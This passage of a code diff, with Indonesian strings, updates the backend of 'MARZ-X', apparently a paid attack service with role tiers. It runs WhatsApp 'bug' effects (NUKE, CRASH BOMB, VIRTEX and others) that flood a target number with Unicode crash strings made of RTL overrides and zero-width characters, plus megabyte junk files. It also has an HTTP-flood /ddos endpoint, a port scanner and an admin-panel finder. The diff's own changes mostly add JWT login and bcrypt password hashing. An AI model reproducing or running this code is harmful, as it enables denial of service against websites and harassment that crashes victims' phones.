-                        caption: `📁 FILE ${i+1}/50`
-                    });
-                    await delay(20);
-                }
-            }
-        } else if (effect === 'VIRTEX_LEGACY') {
-            const chars = '\u202E\u202D\u200B\u200C\u200D\uFEFF\u061C\u2066\u2067\u2068\u2069'.repeat(1000);
-            await send(chars + 'SERANGAN VIRTEX'.repeat(200) + chars);
-            await delay(50);
-            await send('ဪ'.repeat(10000));
-            await delay(50);
-            await send('‍'.repeat(8000) + '💀'.repeat(500));
-            await delay(50);
-            await send('X'.repeat(5000) + '\u202E'.repeat(2000));
-        } else if (effect === 'MEGA SPAM') {
-            const msgs = ['⚠️ BANJIR!', '💥 SPAM!', '🔥 OVERLOAD!', '💀 CRASH!', '👾 VIRUS!', '📱 LEMOT!', '🔴 LOCKED!'];
-            for (let i = 0; i < 200; i++) {
-                await send(`${msgs[i % msgs.length]} [${i+1}/200]` + '!'.repeat(i % 15 + 1));
-                await delay(1);
-                if (i % 50 === 0) {
-                    await send('A'.repeat(3000) + '\u200B'.repeat(2000));
-                }
-            }
-            for (let i = 0; i < 10; i++) {
-                const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
-                await sock.sendMessage(chatId, {
-                    document: buffer,
-                    mimetype: 'application/octet-stream',
-                    fileName: `file_${i+1}.bin`,
-                    caption: `📁 FILE ${i+1}/10`
-                });
-                await delay(30);
-            }
-        } else if (effect === 'CRASH BOMB') {
-            for (let loop = 0; loop < 2; loop++) {
-                const bomb = 'A'.repeat(10000) + '\u200B'.repeat(5000) + '🔥'.repeat(5000) + '\n'.repeat(200) + '💥'.repeat(400) + '\u202E'.repeat(3000);
-                await send(bomb.slice(0, 7000));
-                await delay(50);
-                await send(bomb.slice(7000, 14000));
-                await delay(50);
-                await send(bomb.slice(14000));
-                for (let i = 0; i < 50; i++) {
-                    await send(`[CRASH] ${i+1}/50`);
-                    await delay(2);
-                }
-            }
-        } else {
-            return res.status(400).json({ error: `Efek "${effect}" tidak dikenal` });
+        await delay(30);
+      }
+    } else if (effect === 'BLANK HARD') {
+      for (let loop = 0; loop < 2; loop++) {
+        for (let i = 0; i < 100; i++) {
+          await send('\u200B'.repeat(1500) + '‎‏‎‏'.repeat(300) + '​'.repeat(800) + ' '.repeat(200));
+          await delay(2);
         }
-
-        await updateUserStats(username, 'BUG', targetNumber, `Efek: ${effect}`);
-        res.json({ success: true, effect, target: targetNumber, message: `✅ Efek "${effect}" terkirim ke ${targetNumber}` });
-
-    } catch (error) {
-        console.error('[ERROR]', error);
-        res.status(500).json({ error: error.message || 'Gagal kirim bug' });
+        const bomb = 'A'.repeat(15000) + '\u200B'.repeat(8000) + '🔥'.repeat(7000) + '\n'.repeat(200) + '💥'.repeat(500) + '\u202E'.repeat(3000);
+        await send(bomb.slice(0, 10000));
+        await delay(50);
+        await send(bomb.slice(10000, 20000));
+        await delay(50);
+        await send(bomb.slice(20000));
+        for (let i = 0; i < 200; i++) {
+          await send(`[${i+1}/200] 💀`);
+          await delay(1);
+        }
+        for (let i = 0; i < 20; i++) {
+          const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
+          await sock.sendMessage(chatId, {
+            document: buffer,
+            mimetype: 'application/octet-stream',
+            fileName: `file_${i+1}.bin`,
+            caption: `📁 FILE ${i+1}/20`
+          });
+          await delay(30);
+        }
+      }
+    } else if (effect === 'FREEZE HARD') {
+      for (let i = 0; i < 200; i++) {
+        await send('.');
+        await delay(2);
+        if (i % 50 === 0) {
+          await send('A'.repeat(500) + '🔥'.repeat(100) + '\u200B'.repeat(200));
+        }
+      }
+    } else if (effect === 'FC INSTANT') {
+      for (let loop = 0; loop < 2; loop++) {
+        await send('*_~'.repeat(500) + 'TEKS RUSAK'.repeat(200) + '~_*'.repeat(500));
+        await delay(50);
+        await send('ဪ'.repeat(5000));
+        await delay(50);
+        await send('🔥'.repeat(3000) + '\u202E'.repeat(1000));
+        await delay(50);
+        for (let i = 0; i < 100; i++) {
+          await send(`[FC] ${i+1}/100`);
+          await delay(2);
+        }
+      }
+    } else if (effect === 'RESTART HARD') {
+      for (let i = 0; i < 30; i++) {
+        const buffer = Buffer.alloc(2 * 1024 * 1024, `${i}`.repeat(500).padEnd(2*1024*1024, 'X'));
+        await sock.sendMessage(chatId, {
+          document: buffer,
+          mimetype: 'application/octet-stream',
+          fileName: `file_${i+1}.bin`,
+          caption: `📁 FILE ${i+1}/30`
+        });
+        await delay(30);
+        if (i % 5 === 0) {
+          await send(`[RESTART] ${i+1}/30`);
+        }
+      }
+    } else if (effect === 'BOOTLOOP HARD') {
+      for (let loop = 0; loop < 2; loop++) {
+        for (let i = 0; i < 50; i++) {
+          await send('[LOOP] ' + '\u200B'.repeat(500) + '🔥'.repeat(50) + '\u202E'.repeat(20));
+          await delay(5);
+          if (i % 10 === 0) {
+            const buffer = Buffer.alloc(1 * 1024 * 1024, `X`.repeat(500).padEnd(1024*1024, 'Y'));
+            await sock.sendMessage(chatId, {
+              document: buffer,
+              mimetype: 'application/octet-stream',
+              fileName: `loop_${i}.bin`,
+              caption: `📁 LOOP ${i+1}`
+            });
+          }
+        }
+        const bomb = 'A'.repeat(5000) + '\u200B'.repeat(3000) + '🔥'.repeat(2000);
+        await send(bomb);
+      }
+    } else if (effect === 'NUKE') {
+      for (let loop = 0; loop < 2; loop++) {
+        const bomb = 'A'.repeat(8000) + '\u200B'.repeat(4000) + '🔥'.repeat(3000) + '\n'.repeat(150) + '💥'.repeat(500);
+        await send(bomb.slice(0, 7500));
+        await delay(50);
+        await send(bomb.slice(7500));
+        for (let i = 0; i < 250; i++) {
+          await send(`[NUKE ${i+1}/250] 💀`);
+          await delay(2);
+        }
+        for (let i = 0; i < 50; i++) {
+          const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
+          await sock.sendMessage(chatId, {
+            document: buffer,
+            mimetype: 'application/octet-stream',
+            fileName: `file_${i+1}.bin`,
+            caption: `📁 FILE ${i+1}/50`
+          });
+          await delay(20);
+        }
+      }
+    } else if (effect === 'VIRTEX_LEGACY') {
+      const chars = '\u202E\u202D\u200B\u200C\u200D\uFEFF\u061C\u2066\u2067\u2068\u2069'.repeat(1000);
+      await send(chars + 'SERANGAN VIRTEX'.repeat(200) + chars);
+      await delay(50);
+      await send('ဪ'.repeat(10000));
+      await delay(50);
+      await send('‍'.repeat(8000) + '💀'.repeat(500));
+      await delay(50);
+      await send('X'.repeat(5000) + '\u202E'.repeat(2000));
+    } else if (effect === 'MEGA SPAM') {
+      const msgs = ['⚠️ BANJIR!', '💥 SPAM!', '🔥 OVERLOAD!', '💀 CRASH!', '👾 VIRUS!', '📱 LEMOT!', '🔴 LOCKED!'];
+      for (let i = 0; i < 200; i++) {
+        await send(`${msgs[i % msgs.length]} [${i+1}/200]` + '!'.repeat(i % 15 + 1));
+        await delay(1);
+        if (i % 50 === 0) {
+          await send('A'.repeat(3000) + '\u200B'.repeat(2000));
+        }
+      }
+      for (let i = 0; i < 10; i++) {
+        const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
+        await sock.sendMessage(chatId, {
+          document: buffer,
+          mimetype: 'application/octet-stream',
+          fileName: `file_${i+1}.bin`,
+          caption: `📁 FILE ${i+1}/10`
+        });
+        await delay(30);
+      }
+    } else if (effect === 'CRASH BOMB') {
+      for (let loop = 0; loop < 2; loop++) {
+        const bomb = 'A'.repeat(10000) + '\u200B'.repeat(5000) + '🔥'.repeat(5000) + '\n'.repeat(200) + '💥'.repeat(400) + '\u202E'.repeat(3000);
+        await send(bomb.slice(0, 7000));
+        await delay(50);
+        await send(bomb.slice(7000, 14000));
+        await delay(50);
+        await send(bomb.slice(14000));
+        for (let i = 0; i < 50; i++) {
+          await send(`[CRASH] ${i+1}/50`);
+          await delay(2);
+        }
+      }
+    } else {
+      return res.status(400).json({ error: `Efek "${effect}" tidak dikenal` });
     }
+
+    await updateUserStats(username, 'BUG', targetNumber, `Efek: ${effect}`);
+    res.json({ success: true, effect, target: targetNumber, message: `✅ Efek "${effect}" terkirim ke ${targetNumber}` });
+
+  } catch (error) {
+    console.error('[BUG ERROR]', error);
+    res.status(500).json({ error: error.message || 'Gagal kirim bug' });
+  }
 });
 
 // ============================================================
 // 5. DDOS
 // ============================================================
-app.post('/ddos', async (req, res) => {
-    const { url, username, count = 100, method = 'GET' } = req.body;
-    if (!url) return res.status(400).json({ error: 'URL target wajib diisi' });
-    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });
+app.post('/ddos', verifyToken, async (req, res) => {
+  const { url, count = 100, method = 'GET' } = req.body;
+  const username = req.user.username;
 
-    const hasAccess = await checkToolAccess(username, 'ddos');
-    if (!hasAccess) {
-        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
+  if (!url) return res.status(400).json({ error: 'URL target wajib diisi' });
+
+  const hasAccess = await checkToolAccess(username, 'ddos');
+  if (!hasAccess) {
+    return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
+  }
+
+  console.log(`[DDOS] ${username} -> ${url} (${count} request)`);
+  try {
+    const promises = [];
+    let success = 0, failed = 0;
+    const start = Date.now();
+    const maxReq = Math.min(count, 500);
+
+    for (let i = 0; i < maxReq; i++) {
+      const p = axios({
+        method: method,
+        url: url,
+        timeout: 5000,
+        validateStatus: () => true
+      }).then(() => success++).catch(() => failed++);
+      promises.push(p);
+      if (i % 50 === 0) await delay(10);
     }
 
-    console.log(`[DDOS] ${username} -> ${url} (${count} request)`);
+    await Promise.all(promises);
+    const duration = ((Date.now() - start) / 1000).toFixed(2);
 
-    try {
-        const promises = [];
-        let success = 0, failed = 0;
-        const start = Date.now();
-        const maxReq = Math.min(count, 500);
-
-        for (let i = 0; i < maxReq; i++) {
-            const p = axios({
-                method: method,
-                url: url,
-                timeout: 5000,
-                validateStatus: () => true
-            }).then(() => success++).catch(() => failed++);
-            promises.push(p);
-            if (i % 50 === 0) await delay(10);
-        }
-
-        await Promise.all(promises);
-        const duration = ((Date.now() - start) / 1000).toFixed(2);
-
-        await updateUserStats(username, 'TOOL', url, `DDoS HTTP (${method}) - ${success} sukses, ${failed} gagal`);
-
-        res.json({
-            success: true,
-            target: url,
-            total: maxReq,
-            success,
-            failed,
-            duration: `${duration} detik`,
-            message: `✅ DDoS selesai. ${success} berhasil, ${failed} gagal.`
-        });
-
-    } catch (error) {
-        console.error('[DDOS ERROR]', error);
-        res.status(500).json({ error: error.message || 'Gagal menjalankan DDoS' });
-    }
+    await updateUserStats(username, 'TOOL', url, `DDoS HTTP (${method}) - ${success} sukses, ${failed} gagal`);
+    res.json({
+      success: true,
+      target: url,
+      total: maxReq,
+      success,
+      failed,
+      duration: `${duration} detik`,
+      message: `✅ DDoS selesai. ${success} berhasil, ${failed} gagal.`
+    });
+  } catch (error) {
+    console.error('[DDOS ERROR]', error);
+    res.status(500).json({ error: error.message });
+  }
 });
 
 // ============================================================
 // 6. PORT SCANNER
 // ============================================================
-app.post('/tools/portscan', async (req, res) => {
-    const { host, username, ports } = req.body;
-    if (!host) return res.status(400).json({ error: 'Host wajib diisi' });
-    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });
+app.post('/tools/portscan', verifyToken, async (req, res) => {
+  const { host, ports } = req.body;
+  const username = req.user.username;
+  if (!host) return res.status(400).json({ error: 'Host wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'portscan');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak' });
 
-    const hasAccess = await checkToolAccess(username, 'portscan');
-    if (!hasAccess) {
-        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
-    }
-
-    const portList = ports ? ports.split(',').map(p => parseInt(p.trim())) : [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017];
-    console.log(`[PORTSCAN] ${username} -> ${host} (${portList.length} ports)`);
-
-    try {
-        const results = [];
-        const timeout = 2000;
-
-        for (const port of portList) {
-            const start = Date.now();
-            const result = await new Promise((resolve) => {
-                const socket = new net.Socket();
-                const timer = setTimeout(() => {
-                    socket.destroy();
-                    resolve({ port, status: 'closed', time: Date.now() - start });
-                }, timeout);
-                socket.on('connect', () => {
-                    clearTimeout(timer);
-                    socket.destroy();
-                    resolve({ port, status: 'open', time: Date.now() - start });
-                });
-                socket.on('error', () => {
-                    clearTimeout(timer);
-                    resolve({ port, status: 'filtered', time: Date.now() - start });
-                });
-                socket.connect(port, host);
-            });
-            results.push(result);
-        }
-
-        const openPorts = results.filter(r => r.status === 'open');
-        const summary = `Host: ${host}, Open: ${openPorts.length}, Total: ${results.length}`;
-
-        await updateUserStats(username, 'TOOL', host, `Port Scan: ${summary}`);
-
-        res.json({
-            success: true,
-            host,
-            results: results,
-            openPorts: openPorts.map(r => r.port),
-            summary,
-            message: `✅ Port scan selesai. ${openPorts.length} port terbuka.`
-        });
-
-    } catch (error) {
-        console.error('[PORTSCAN ERROR]', error);
-        res.status(500).json({ error: error.message || 'Gagal scan port' });
-    }
+  const portList = ports ? ports.split(',').map(p => parseInt(p.trim())) : [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017];
+  const results = [];
+  for (const port of portList) {
+    const start = Date.now();
+    const result = await new Promise((resolve) => {
+      const socket = new net.Socket();
+      const timer = setTimeout(() => { socket.destroy(); resolve({ port, status: 'closed', time: Date.now()-start }); }, 2000);
+      socket.on('connect', () => { clearTimeout(timer); socket.destroy(); resolve({ port, status: 'open', time: Date.now()-start }); });
+      socket.on('error', () => { clearTimeout(timer); resolve({ port, status: 'filtered', time: Date.now()-start }); });
+      socket.connect(port, host);
+    });
+    results.push(result);
+  }
+  const openPorts = results.filter(r => r.status === 'open');
+  await updateUserStats(username, 'TOOL', host, `Port Scan: ${openPorts.length} open`);
+  res.json({ success: true, host, results, openPorts: openPorts.map(r=>r.port), message: `✅ ${openPorts.length} port terbuka` });
 });
 
 // ============================================================
 // 7. REVERSE IP
 // ============================================================
-app.post('/tools/reverseip', async (req, res) => {
-    const { ip, username } = req.body;
-    if (!ip) return res.status(400).json({ error: 'IP wajib diisi' });
-    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });
-
-    const hasAccess = await checkToolAccess(username, 'reverseip');
-    if (!hasAccess) {
-        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
-    }
-
-    try {
-        const domain = await new Promise((resolve, reject) => {
-            dns.reverse(ip, (err, hostnames) => {
-                if (err) reject(err);
-                else resolve(hostnames);
-            });
-        });
-
-        await updateUserStats(username, 'TOOL', ip, `Reverse IP: ${domain.join(', ')}`);
-
-        res.json({
-            success: true,
-            ip: ip,
-            domain: domain,
-            message: `✅ Reverse IP berhasil: ${domain.join(', ')}`
-        });
-
-    } catch (error) {
-        console.error('[REVERSE IP ERROR]', error);
-        res.status(500).json({ error: error.message || 'Gagal reverse IP' });
-    }
+app.post('/tools/reverseip', verifyToken, async (req, res) => {
+  const { ip } = req.body;
+  const username = req.user.username;
+  if (!ip) return res.status(400).json({ error: 'IP wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'reverseip');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak' });
+  try {
+    const domain = await new Promise((resolve, reject) => dns.reverse(ip, (err, hostnames) => err ? reject(err) : resolve(hostnames)));
+    await updateUserStats(username, 'TOOL', ip, `Reverse IP: ${domain.join(', ')}`);
+    res.json({ success: true, ip, domain, message: `✅ Domain: ${domain.join(', ')}` });
+  } catch (error) { res.status(500).json({ error: error.message }); }
 });
 
 // ============================================================
 // 8. OSINT LOOKUP
 // ============================================================
-app.post('/tools/osint', async (req, res) => {
-    const { target, username } = req.body;
-    if (!target) return res.status(400).json({ error: 'Target (IP atau nomor HP) wajib diisi' });
-    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });
+app.post('/tools/osint', verifyToken, async (req, res) => {
+  const { target } = req.body;
+  const username = req.user.username;
+  if (!target) return res.status(400).json({ error: 'Target wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'osint');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak' });
 
-    const hasAccess = await checkToolAccess(username, 'osint');
-    if (!hasAccess) {
-        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
-    }
-
-    const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(target);
-    const isPhone = /^(\+?\d{10,15})$/.test(target);
-
-    try {
-        let result = {};
-        if (isIP) {
-            const ipRes = await axios.get(`https://ipinfo.io/${target}/json`);
-            result = { type: 'IP', ip: target, data: ipRes.data };
-        } else if (isPhone) {
-            result = {
-                type: 'Phone',
-                number: target,
-                data: { country: 'Indonesia (estimasi)', carrier: 'Telkomsel / Indosat / XL (estimasi)' },
-                note: 'Informasi nomor HP hanya perkiraan, gunakan API berbayar untuk akurasi.'
-            };
-        } else {
-            return res.status(400).json({ error: 'Target harus berupa IP atau nomor HP' });
-        }
-
-        await updateUserStats(username, 'TOOL', target, `OSINT Lookup: ${JSON.stringify(result)}`);
-        res.json({ success: true, target, result });
-    } catch (error) {
-        console.error('[OSINT ERROR]', error);
-        res.status(500).json({ error: error.message || 'Gagal melakukan OSINT lookup' });
-    }
+  const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(target);
+  const isPhone = /^(\+?\d{10,15})$/.test(target);
+  let result = {};
+  if (isIP) {
+    const ipRes = await axios.get(`https://ipinfo.io/${target}/json`);
+    result = { type: 'IP', ip: target, data: ipRes.data };
+  } else if (isPhone) {
+    result = { type: 'Phone', number: target, data: { country: 'Indonesia (estimasi)', carrier: 'Telkomsel / Indosat / XL (estimasi)' }, note: 'Perkiraan, gunakan API berbayar.' };
+  } else {
+    return res.status(400).json({ error: 'Target harus IP atau nomor HP' });
+  }
+  await updateUserStats(username, 'TOOL', target, `OSINT Lookup: ${JSON.stringify(result)}`);
+  res.json({ success: true, target, result });
 });
 
 // ============================================================
 // 9. ADMIN FINDER
 // ============================================================
-app.post('/tools/adminfinder', async (req, res) => {
-    const { url, username } = req.body;
-    if (!url) return res.status(400).json({ error: 'URL website wajib diisi' });
-    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });
+app.post('/tools/adminfinder', verifyToken, async (req, res) => {
+  const { url } = req.body;
+  const username = req.user.username;
+  if (!url) return res.status(400).json({ error: 'URL wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'adminfinder');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak' });
 
-    const hasAccess = await checkToolAccess(username, 'adminfinder');
-    if (!hasAccess) {
-        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
-    }
-
-    const adminPaths = [
-        'admin', 'administrator', 'wp-admin', 'login', 'admin/login',
-        'admin.php', 'dashboard', 'cp', 'cpanel', 'admin_area',
-        'panel', 'backend', 'auth', 'signin', 'log-in'
-    ];
-
-    const found = [];
-    const baseUrl = url.endsWith('/') ? url.slice(0, -1) : url;
-
-    for (const path of adminPaths) {
-        try {
-            const testUrl = `${baseUrl}/${path}`;
-            const response = await axios.get(testUrl, { timeout: 3000, validateStatus: () => true });
-            if (response.status === 200) {
-                found.push({ path, url: testUrl, status: 200 });
-            } else if (response.status === 401 || response.status === 403) {
-                found.push({ path, url: testUrl, status: response.status, note: 'Memerlukan autentikasi' });
-            }
-        } catch (e) {}
-    }
-
-    await updateUserStats(username, 'TOOL', url, `Admin Finder: ${found.length} ditemukan`);
-    res.json({
-        success: true,
-        url: baseUrl,
-        found: found,
-        total: found.length,
-        message: `✅ Admin finder selesai. ${found.length} path ditemukan.`
-    });
+  const adminPaths = ['admin','administrator','wp-admin','login','admin/login','admin.php','dashboard','cp','cpanel','admin_area','panel','backend','auth','signin','log-in'];
+  const found = [];
+  const baseUrl = url.endsWith('/') ? url.slice(0,-1) : url;
+  for (const path of adminPaths) {
+    try {
+      const testUrl = `${baseUrl}/${path}`;
+      const response = await axios.get(testUrl, { timeout: 3000, validateStatus: () => true });
+      if (response.status === 200 || response.status === 401 || response.status === 403) {
+        found.push({ path, url: testUrl, status: response.status });
+      }
+    } catch(e) {}
+  }
+  await updateUserStats(username, 'TOOL', url, `Admin Finder: ${found.length} ditemukan`);
+  res.json({ success: true, url: baseUrl, found, total: found.length });
 });
 
 // ============================================================
 // 10. WEB SCRAPER
 // ============================================================
-app.post('/tools/webscraper', async (req, res) => {
-    const { url, username } = req.body;
-    if (!url) return res.status(400).json({ error: 'URL website wajib diisi' });
-    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });
-
-    const hasAccess = await checkToolAccess(username, 'webscraper');
-    if (!hasAccess) {
-        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
-    }
-
-    try {
-        const response = await axios.get(url, { timeout: 10000 });
-        const html = response.data;
-
-        const titleMatch = html.match(/<title>(.*?)<\/title>/i);
-        const title = titleMatch ? titleMatch[1] : 'Tidak ditemukan';
-
-        const descMatch = html.match(/<meta\s+name="description"\s+content="(.*?)"/i);
-        const description = descMatch ? descMatch[1] : 'Tidak ditemukan';
-
-        const links = html.match(/<a\s+href="(.*?)"/gi)?.map(l => l.match(/href="(.*?)"/)[1]) || [];
-        const sampleLinks = links.slice(0, 20);
-
-        await updateUserStats(username, 'TOOL', url, `Web Scraper: ${title}`);
-
-        res.json({
-            success: true,
-            url,
-            title,
-            description,
-            totalLinks: links.length,
-            sampleLinks,
-            message: `✅ Web scraper selesai. Ditemukan ${links.length} link.`
-        });
-
-    } catch (error) {
-        console.error('[WEB SCRAPER ERROR]', error);
-        res.status(500).json({ error: error.message || 'Gagal mengambil konten website' });
-    }
+app.post('/tools/webscraper', verifyToken, async (req, res) => {
+  const { url } = req.body;
+  const username = req.user.username;
+  if (!url) return res.status(400).json({ error: 'URL wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'webscraper');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak' });
+  try {
+    const response = await axios.get(url, { timeout: 10000 });
+    const html = response.data;
+    const title = html.match(/<title>(.*?)<\/title>/i)?.[1] || 'Tidak ditemukan';
+    const desc = html.match(/<meta\s+name="description"\s+content="(.*?)"/i)?.[1] || 'Tidak ditemukan';
+    const links = html.match(/<a\s+href="(.*?)"/gi)?.map(l => l.match(/href="(.*?)"/)[1]) || [];
+    await updateUserStats(username, 'TOOL', url, `Web Scraper: ${title}`);
+    res.json({ success: true, url, title, description: desc, totalLinks: links.length, sampleLinks: links.slice(0,20) });
+  } catch (error) { res.status(500).json({ error: error.message }); }
 });
 
 // ============================================================
-// 11. MANAGE USER – HANYA MASTER
+// 11. GLOBAL STATS (TAMBAHAN)
 // ============================================================
-app.get('/users', checkMaster, async (req, res) => {
-    try {
-        const { data: users, error } = await supabase
-            .from('users')
-            .select('username, role, active, permanent, expired, created_by')
-            .order('username');
-
-        if (error) throw error;
-        res.json({ success: true, users });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
+app.get('/tools/global-stats', verifyToken, async (req, res) => {
+  const username = req.user.username;
+  const { data: user, error } = await supabase
+    .from('users')
+    .select('role')
+    .eq('username', username)
+    .single();
+  if (error || !user) return res.status(401).json({ error: 'User tidak ditemukan' });
+  if (!['master', 'owner', 'admin'].includes(user.role)) {
+    return res.status(403).json({ error: 'Akses ditolak. Hanya admin ke atas.' });
+  }
+  try {
+    const { data: users } = await supabase.from('users').select('username');
+    let totalBug = 0, totalTool = 0;
+    for (const u of users) {
+      const { data: stats } = await supabase
+        .from('users_stats')
+        .select('bug_count, tool_count')
+        .eq('username', u.username)
+        .single();
+      if (stats) {
+        totalBug += (stats.bug_count || 0);
+        totalTool += (stats.tool_count || 0);
+      }
     }
+    res.json({ success: true, totalUsers: users.length, totalBug, totalTool });
+  } catch (err) {
+    console.error('[GLOBAL STATS ERROR]', err);
+    res.status(500).json({ error: err.message });
+  }
 });
 
-app.post('/add-user', checkMaster, async (req, res) => {
-    const { username, password, role = 'member', expired = null, created_by } = req.body;
-    if (!username || !password) {
-        return res.status(400).json({ error: 'username dan password wajib diisi' });
-    }
-
-    try {
-        const { data: existing } = await supabase
-            .from('users')
-            .select('username')
-            .eq('username', username)
-            .single();
-
-        if (existing) {
-            return res.status(400).json({ error: 'Username sudah ada' });
-        }
-
-        const crypto = require('crypto');
-        const hash = crypto.createHash('sha256').update(password).digest('hex');
-
-        const newUser = {
-            username,
-            password: hash,
-            role,
-            active: true,
-            permanent: !expired,
-            expired: expired || null,
-            created_by: created_by || req.body.username
-        };
-
-        const { data, error } = await supabase.from('users').insert(newUser).select();
-        if (error) throw error;
-
-        res.json({ success: true, user: data[0] });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
+// ============================================================
+// ADMIN ENDPOINTS (MANAGE USER) – pakai checkMaster
+// ============================================================
+app.get('/users', verifyToken, checkMaster, async (req, res) => {
+  const { data: users, error } = await supabase.from('users').select('username, role, active, permanent, expired, created_by').order('username');
+  if (error) return res.status(500).json({ error: error.message });
+  res.json({ success: true, users });
 });
 
-app.put('/edit-user/:username', checkMaster, async (req, res) => {
-    const targetUsername = req.params.username;
-    const { role, active, permanent, expired } = req.body;
+app.post('/add-user', verifyToken, checkMaster, async (req, res) => {
+  const { username, password, role = 'member', expired = null } = req.body;
+  if (!username || !password) return res.status(400).json({ error: 'username dan password wajib' });
 
-    if (!role && active === undefined && permanent === undefined && expired === undefined) {
-        return res.status(400).json({ error: 'Tidak ada field yang diupdate' });
-    }
+  const { data: existing } = await supabase.from('users').select('username').eq('username', username).single();
+  if (existing) return res.status(400).json({ error: 'Username sudah ada' });
 
-    try {
-        const updateData = {};
-        if (role) updateData.role = role;
-        if (active !== undefined) updateData.active = active;
-        if (permanent !== undefined) updateData.permanent = permanent;
-        if (expired !== undefined) updateData.expired = expired;
+  const salt = await bcrypt.genSalt(10);
+  const hash = await bcrypt.hash(password, salt);
+  const newUser = {
+    username,
+    password: hash,
+    role,
+    active: true,
+    permanent: !expired,
+    expired: expired || null,
+    created_by: req.user.username
+  };
 
-        const { data, error } = await supabase
-            .from('users')
-            .update(updateData)
-            .eq('username', targetUsername)
-            .select();
-
-        if (error) throw error;
-        if (!data || data.length === 0) {
-            return res.status(404).json({ error: 'User tidak ditemukan' });
-        }
-        res.json({ success: true, user: data[0] });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
+  const { data, error } = await supabase.from('users').insert(newUser).select();
+  if (error) return res.status(500).json({ error: error.message });
+  res.json({ success: true, user: data[0] });
 });
 
-app.delete('/delete-user/:username', checkMaster, async (req, res) => {
-    const targetUsername = req.params.username;
-    if (targetUsername === req.body.username) {
-        return res.status(400).json({ error: 'Tidak bisa hapus diri sendiri' });
-    }
+app.put('/edit-user/:username', verifyToken, checkMaster, async (req, res) => {
+  const target = req.params.username;
+  const { role, active, permanent, expired } = req.body;
+  const updateData = {};
+  if (role !== undefined) updateData.role = role;
+  if (active !== undefined) updateData.active = active;
+  if (permanent !== undefined) updateData.permanent = permanent;
+  if (expired !== undefined) updateData.expired = expired;
 
-    try {
-        const { error } = await supabase
-            .from('users')
-            .delete()
-            .eq('username', targetUsername);
+  const { data, error } = await supabase.from('users').update(updateData).eq('username', target).select();
+  if (error || !data || data.length===0) return res.status(404).json({ error: 'User tidak ditemukan' });
+  res.json({ success: true, user: data[0] });
+});
 
-        if (error) throw error;
-        res.json({ success: true, message: `User ${targetUsername} dihapus` });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
+app.delete('/delete-user/:username', verifyToken, checkMaster, async (req, res) => {
+  const target = req.params.username;
+  if (target === req.user.username) return res.status(400).json({ error: 'Tidak bisa hapus diri sendiri' });
+  const { error } = await supabase.from('users').delete().eq('username', target);
+  if (error) return res.status(500).json({ error: error.message });
+  res.json({ success: true, message: `User ${target} dihapus` });
 });
 
 // ============================================================
 // ROOT
 // ============================================================
 app.get('/', (req, res) => {
-    res.json({
-        name: 'MARZ-X Backend',
-        version: '3.0.0',
-        status: 'online',
-        nodeVersion: process.version,
-        roles: {
-            member: '5 efek bug, 2 tools (ddos, portscan)',
-            admin: '8 efek bug, 4 tools (+ osint, adminfinder)',
-            owner: '8 efek bug, 6 tools (semua)',
-            master: '10 efek bug, 6 tools (semua) + manage user'
-        },
-        endpoints: {
-            whatsapp: {
-                pairing: 'POST /pairing-code {username, phoneNumber}',
-                qr: 'GET /qr/:username',
-                status: 'GET /status',
-                statusUser: 'GET /status/:username',
-                sendBug: 'POST /send-bug {username, targetNumber, effect}'
-            },
-            ddos: { httpFlood: 'POST /ddos {username, url, count, method}' },
-            tools: {
-                portScan: 'POST /tools/portscan {username, host, ports}',
-                reverseIp: 'POST /tools/reverseip {username, ip}',
-                osint: 'POST /tools/osint {username, target}',
-                adminFinder: 'POST /tools/adminfinder {username, url}',
-                webScraper: 'POST /tools/webscraper {username, url}'
-            },
-            admin: {
-                users: 'GET /users?username=master (only master)',
-                addUser: 'POST /add-user (only master)',
-                editUser: 'PUT /edit-user/:username (only master)',
-                deleteUser: 'DELETE /delete-user/:username (only master)'
-            }
-        }
-    });
+  res.json({
+    name: 'MARZ-X Backend',
+    version: '3.1.1 FINAL',
+    status: 'online',
+    note: 'Gunakan /login untuk mendapatkan JWT token, lalu kirim di header Authorization: Bearer <token>'
+  });
 });
 
 // ============================================================
 // JALANKAN SERVER
 // ============================================================
-const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`[SERVER] MARZ-X Backend running on port ${PORT}`);
-    console.log(`[NODE] Version: ${process.version}`);
